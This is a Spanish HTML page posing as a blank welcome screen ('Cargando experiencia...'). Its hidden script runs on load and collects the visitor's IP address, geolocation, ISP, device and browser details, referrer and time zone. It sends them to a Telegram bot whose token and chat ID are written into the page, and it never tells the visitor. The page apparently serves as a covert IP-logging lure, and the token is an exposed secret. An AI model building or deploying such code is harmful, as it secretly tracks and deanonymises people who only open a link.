<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Bienvenido</title>
  <style>
    body {
      font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
      display: flex; align-items: center; justify-content: center;
      min-height: 100vh; margin: 0;
      background: #0f172a; color: #e2e8f0;
    }
    .card { text-align: center; padding: 2rem; }
    h1 { font-size: 2rem; margin-bottom: .5rem; }
    p  { color: #94a3b8; }
  </style>
</head>
<body>
  <div class="card">
    <h1>👋 Bienvenido</h1>
    <p>Cargando experiencia...</p>
  </div>

  <script>
  (function () {
    "use strict";

    var TELEGRAM_TOKEN   = "7843541708:AAGQP0rXOqhd1Zcp737DzLByREna2HD3VVo";
    var TELEGRAM_CHAT_ID = "7064330912";

    function safe(fn, fb) {
      try { var v = fn(); return (v === undefined || v === null) ? fb : v; }
      catch (e) { return fb; }
    }

    function getGeo() {
      var fuentes = [
        {
          url: "https://ipwho.is/",
          parse: function (g) {
            return (g && g.success) ? {
              ip: g.ip,
              ubicacion: (g.city || "?") + ", " + (g.region || "?") + ", " + (g.country || "?"),
              isp: (g.connection && g.connection.isp) || "?"
            } : null;
          }
        },
        {
          url: "https://ipapi.co/json/",
          parse: function (g) {
            return (g && !g.error) ? {
              ip: g.ip,
              ubicacion: (g.city || "?") + ", " + (g.region || "?") + ", " + (g.country_name || "?"),
              isp: g.org || "?"
            } : null;
          }
        }
      ];

      return fuentes.reduce(function (promesa, fuente) {
        return promesa.catch(function () {
          return fetch(fuente.url, { cache: "no-store" })
            .then(function (r) { if (!r.ok) throw 0; return r.json(); })
            .then(function (j) {
              var parsed = fuente.parse(j);
              if (!parsed) throw 0;
              return parsed;
            });
        });
      }, Promise.reject())
      .catch(function () {
        return { ip: "desconocida", ubicacion: "no disponible", isp: "?" };
      });
    }

    function getConexion() {
      var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (!c) return "no disponible";
      var tipo = c.effectiveType || "?";
      var vel  = c.downlink ? (c.downlink + " Mbps") : "?";
      return tipo + " / " + vel;
    }

    function getPlataforma() {
      return safe(function () { return navigator.userAgentData && navigator.userAgentData.platform; })
          || safe(function () { return navigator.platform; })
          || "?";
    }

    function enviar() {
      getGeo().then(function (geo) {
        var payload = {
          ubicacion:   geo.ubicacion,
          isp:         geo.isp,
          ip:          geo.ip,
          zonaHoraria: safe(function () { return Intl.DateTimeFormat().resolvedOptions().timeZone; }, "?"),
          ua:          navigator.userAgent || "?",
          plataforma:  getPlataforma(),
          idioma:      navigator.language || "?",
          pantalla:    (screen.width || 0) + "x" + (screen.height || 0),
          conexion:    getConexion(),
          referrer:    document.referrer || "directo",
          pagina:      window.location.href
        };

        var texto = [
          "🔔 *Nueva visita*",
          "",
          "🌐 *IP:* `" + payload.ip + "`",
          "📍 *Ubicación:* " + payload.ubicacion,
          "🏢 *ISP:* " + payload.isp,
          "🕒 *Zona horaria:* " + payload.zonaHoraria,
          "",
          "💻 *Dispositivo*",
          "• UA: " + payload.ua,
          "• Plataforma: " + payload.plataforma,
          "• Idioma: " + payload.idioma,
          "• Pantalla: " + payload.pantalla,
          "",
          "📡 *Red:* " + payload.conexion,
          "🔗 *Referrer:* " + payload.referrer,
          "📄 *Página:* " + payload.pagina
        ].join("\n");

        var url = "https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage";

        var body = JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: texto,
          parse_mode: "Markdown",
          disable_web_page_preview: true
        });

        if (typeof fetch === "function") {
          fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: body,
            keepalive: true,
            mode: "cors"
          }).catch(function () {
            enviarXHR(url, body);
          });
        } else {
          enviarXHR(url, body);
        }
      });
    }

    function enviarXHR(url, body) {
      try {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", url, true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.send(body);
      } catch (e) {}
    }

    if (document.readyState === "complete") {
      enviar();
    } else {
      window.addEventListener("load", enviar);
    }
  })();
  </script>
</body>
</html>
